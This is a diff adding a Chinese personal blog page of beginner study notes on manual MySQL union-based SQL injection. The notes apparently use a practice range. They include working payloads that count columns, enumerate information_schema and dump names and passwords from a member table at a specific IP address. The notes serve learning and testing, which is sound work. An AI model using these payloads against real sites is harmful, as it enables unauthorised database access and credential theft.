@@ -1,0 +1,93 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author"><title>SQL注入1-浅浅了解 · BigbigPeanut’s blog</title><meta name="description" content="SQL手工注入1.信息收集回顾一下
+​	Show databases；
+​	Use 数据库名
+​	Show tables；
+3.SQL语句基础回顾一下
+查询所有数据库名称
+show databases；
+选中某个数据库
+use 数据名字
+查询数据库中所有的表
+show tables；
+查询表中所有数"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">BigbigPeanut’s blog</a></h3></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>SQL注入1-浅浅了解</a></h3></div><div class="post-content"><h1 id="SQL手工注入"><a href="#SQL手工注入" class="headerlink" title="SQL手工注入"></a>SQL手工注入</h1><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p>回顾一下</p>
+<p>​	Show databases；</p>
+<p>​	Use 数据库名</p>
+<p>​	Show tables；</p>
+<h3 id="3-SQL语句基础"><a href="#3-SQL语句基础" class="headerlink" title="3.SQL语句基础"></a>3.SQL语句基础</h3><p>回顾一下</p>
+<p>查询所有数据库名称</p>
+<p>show databases；</p>
+<p>选中某个数据库</p>
+<p>use 数据名字</p>
+<p>查询数据库中所有的表</p>
+<p>show tables；</p>
+<p>查询表中所有数据 * 代表所有</p>
+<p>select * from 表名</p>
+<p>条件查询表中数据 where  条件 成立才会执行  if</p>
+<p>select 字段名 from 表名 where xx &#x3D; xx；</p>
+<p>合并&#x2F;联合查询 字段数量要相同</p>
+<p>select 字段名 from 表名 union select 字段名 from 表名</p>
+<h3 id="3-MYSQL手工注入流程"><a href="#3-MYSQL手工注入流程" class="headerlink" title="3.MYSQL手工注入流程"></a>3.MYSQL手工注入流程</h3><p>1.判断注入点</p>
+<p>?id&#x3D;1 随便输入</p>
+<p>网页报错  注入点</p>
+<p>网页没有报错  没有注入点</p>
+<p>  And 1 &#x3D; 1</p>
+<p>  And 1 &#x3D; 2 </p>
+<p> 乱输入测试是否有注入点</p>
+<p>2.猜解列名数量（字段数） </p>
+<p>order by x 对数据进行排序 </p>
+<p>查询这个表有有几个字段</p>
+<p>看看有没有报错</p>
+<p>3.报错猜解   </p>
+<p>联合查询 union</p>
+<p>两个特性：</p>
+<p>1、前面的查询语句和后面的语句，互不干扰</p>
+<p>2、前面的查询语句和后面的查询语句，字段数量需要一致，否则报错</p>
+<p>Id&#x3D; -1 union select 1,2,3,4</p>
+<p>4.判断回显点</p>
+<p>利用数据回显点，进行信息收集</p>
+<p>5.信息收集</p>
+<p>数据库版本 version()</p>
+<p>数据库名 database()</p>
+<p>数据库用户 user()</p>
+<p>操作系统 @@version_compile_os</p>
+<h3 id="4-MYSQL系统库释义"><a href="#4-MYSQL系统库释义" class="headerlink" title="4.MYSQL系统库释义"></a>4.MYSQL系统库释义</h3><p>1.在mysql5.0版本以上，mysql自带一个数据库information_schema</p>
+<p>2.数据库中符号”.”代表下一级 user.name</p>
+<p>Information_schema.tables  记录所有表名信息的表</p>
+<p>Information_schema.coumns 记录所有列名信息的表</p>
+<p>Table_name :表名</p>
+<p>Column_name： 列名</p>
+<p>Table_schema:数据库名</p>
+<p>查询指定A数据库名 下的表名信息： </p>
+<p>  <a target="_blank" rel="noopener" href="http://219.153.49.228:46993/new_list.php?id=-1">http://219.153.49.228:46993/new_list.php?id=-1</a> union select 1,group_concat(table_name),3 from<br>  information_schema.tables where table_schema &#x3D; database();</p>
+<p>  union select 1,group_concat(table_name),3,4 from information_schema.tables<br>  where table_schema&#x3D;database()</p>
+<p>查询指定表名表下列的信息</p>
+<p><a target="_blank" rel="noopener" href="http://219.153.49.228:46993/new_list.php?id=-1">http://219.153.49.228:46993/new_list.php?id=-1</a> union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name &#x3D;  0x7573657273</p>
+<p> union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name &#x3D; ‘StormGroup_member’</p>
+<p>查询指定数据  name password</p>
+<p><a target="_blank" rel="noopener" href="http://219.153.49.228:46993/new_list.php?id=-1">http://219.153.49.228:46993/new_list.php?id=-1</a> union select 1,name,password,4 from  StormGroup_member limit 1,1</p>
+<p>union SELECT 1,2,(select group_concat(name,password) from users),4</p>
+<p>整理一下4-5步</p>
+<p>1.在mysql5.0版本以上，mysql自带一个数据库information_schema</p>
+<p>2.数据库中符号”.”代表下一级 user.name</p>
+<p>Information_schema.tables  记录所有表名信息的表</p>
+<p>Information_schema.coumns 记录所有列名信息的表</p>
+<p>Table_name :表名</p>
+<p>Column_name：列名</p>
+<p>Table_schema:数据库名</p>
+<p>4、利用数据回显点 信息收集</p>
+<p>数据库名字 database()</p>
+<p>版本号 version()</p>
+<p>用户名 user()……</p>
+<p>5、数据库名字： mozhe_Discuz_StormGroup</p>
+<p> 有哪些数据表？</p>
+<p>查询数据表的语句</p>
+<p>union select 1,table_name,3,4 from information_schema.tables</p>
+<p>查询所有的数据表的表名</p>
+<p>union select 1,table_name,3,4 from information_schema.tables where table_schema&#x3D;database(‘mozhe_Discuz_StormGroup’)</p>
+<p>表名：StormGroup_member,notice</p>
+<p>查询StormGroup_member中的所有字段</p>
+<p>union select 1,table_name,3,4 from information_schema.columns where table_name&#x3D;’StormGroup_member’</p>
+<p>查询StormGroup_member中的name,password</p>
+<p>union select 1,name,password,4 from StormGroup_member limit 1,1</p>
+<p>就可以得到第一个账号密码啦</p>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-02-09</span><i class="fa fa-tag"></i></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2023/02/09/SQL注入1-浅浅了解/,BigbigPeanut’s blog,SQL注入1-浅浅了解,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2023/02/09/misc%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E6%9B%B4%E6%96%B0%E4%B8%AD/" title="misc初步学习更新中">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/02/07/%E7%9C%8B%E5%88%B0%E4%B8%80%E9%81%93%E9%A2%98-%E9%A1%BA%E6%89%8B%E5%81%9A%E4%B8%80%E4%B8%8B/" title="看到一道题 顺手做一下">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
